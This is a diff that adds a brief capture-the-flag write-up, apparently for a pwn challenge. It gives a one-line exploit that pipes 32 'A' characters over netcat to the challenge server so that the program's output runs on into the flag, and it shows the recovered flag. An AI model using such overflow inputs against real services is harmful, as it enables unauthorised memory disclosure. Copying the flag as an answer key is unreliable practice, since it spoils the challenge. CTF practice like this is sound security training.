@@ -1,0 +1,4 @@
+Just print exactly 32 so when printing the favorite color it just continues on to the flag
+
+❯ python3 -c 'print("A" * 32)' | nc challs.pwnoh.io 13370
+What's your favorite color? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbctf{1_d0n7_c4r3_571ll_4_m1d_c010r}!?!? Mid af color
